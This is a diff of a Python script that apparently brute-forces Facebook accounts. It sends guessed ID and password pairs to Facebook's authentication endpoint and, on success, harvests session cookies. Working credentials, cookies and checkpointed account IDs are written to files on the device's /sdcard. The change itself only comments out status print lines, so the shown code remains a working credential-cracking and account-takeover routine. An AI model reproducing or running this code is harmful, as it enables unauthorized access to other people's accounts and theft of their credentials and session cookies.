@@ -248,7 +248,7 @@ class main_crack():
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);YUKIb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={YUKIb};{ckkk}"
-                    print(f"\r{R} [YUKI-OK] {sid} | {ps} {S}")
+                   # print(f"\r{R} [YUKI-OK] {sid} | {ps} {S}")
                     oks.append(sid)
                     open('/sdcard/YUKI_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/YUKI_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
@@ -319,7 +319,7 @@ class main_crack():
                     open('/sdcard/YUKI_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/YUKI_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                      print(f"\r{A} [YUKI-CP] {sid} | {ps} {S}")
+                     # print(f"\r{A} [YUKI-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/YUKI_CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
@@ -380,7 +380,7 @@ class main_crack():
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);YUKIb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={YUKIb};{ckkk}"
-                    print(f"\r{R} [YUKI-OK] {sid} | {ps} {S}")
+                   # print(f"\r{R} [YUKI-OK] {sid} | {ps} {S}")
                     oks.append(sid)
                     open('/sdcard/YUKI_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/YUKI_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
